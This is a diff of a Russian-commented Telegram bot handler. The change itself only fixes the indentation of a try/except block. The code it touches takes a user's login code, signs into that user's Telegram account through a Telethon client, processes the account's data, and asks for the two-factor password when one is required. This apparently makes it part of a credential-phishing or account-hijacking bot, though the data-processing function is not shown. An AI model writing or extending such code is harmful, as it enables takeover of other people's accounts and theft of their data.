@@ -111,23 +111,23 @@ async def process_code(message: types.Message):
         if len(code) != 5 or not code.isdigit():
             raise ValueError("Пин-код должен состоять из 5 цифр.")
 
-    # Входим в аккаунт с использованием номера телефона и пин-кода
-    await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash.phone_code_hash)
-    
-    # Обрабатываем данные пользователя
-    await process_user_data(client, phone_number, user_id)
-except SessionPasswordNeededError:
-    # Если требуется пароль двухфакторной аутентификации, запрашиваем его у пользователя
-    await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
-    user_state[message.from_user.id]['awaiting_password'] = True
-except Exception as e:
-    await message.reply(f"Произошла ошибка: {e}")
-finally:
-    # Разлогиниваемся после завершения
-    await client.log_out()
-    await client.disconnect()
-    # Удаляем состояние пользователя
-    user_state.pop(message.from_user.id, None)
+        # Входим в аккаунт с использованием номера телефона и пин-кода
+        await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash.phone_code_hash)
+        
+        # Обрабатываем данные пользователя
+        await process_user_data(client, phone_number, user_id)
+    except SessionPasswordNeededError:
+        # Если требуется пароль двухфакторной аутентификации, запрашиваем его у пользователя
+        await message.reply("Необходим пароль двухфакторной аутентификации. Пожалуйста, введите ваш пароль.")
+        user_state[message.from_user.id]['awaiting_password'] = True
+    except Exception as e:
+        await message.reply(f"Произошла ошибка: {e}")
+    finally:
+        # Разлогиниваемся после завершения
+        await client.log_out()
+        await client.disconnect()
+        # Удаляем состояние пользователя
+        user_state.pop(message.from_user.id, None)
 
 Обработчик сообщений для ввода пароля двухфакторной аутентификации
 
